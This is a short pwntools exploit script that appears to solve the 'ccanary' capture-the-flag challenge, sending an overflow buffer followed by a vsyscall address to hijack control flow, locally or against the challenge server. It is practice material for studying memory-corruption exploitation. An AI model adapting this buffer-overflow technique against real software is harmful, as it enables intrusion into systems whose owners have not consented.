from pwn import *

#context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './ccanary'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  s = process("ncat --ssl 7b0000002cd86bc423bad400-ccanary.challenge.master.allesctf.net 31337", shell=True)
else:
  s = process(BINARY)
 
s.recvuntil("quote> ")

buf  = "A"*(0x1f)
buf += p64(0xffffffffff600400)  # sys_time
buf += p64(1)
s.sendline(buf)

s.interactive()
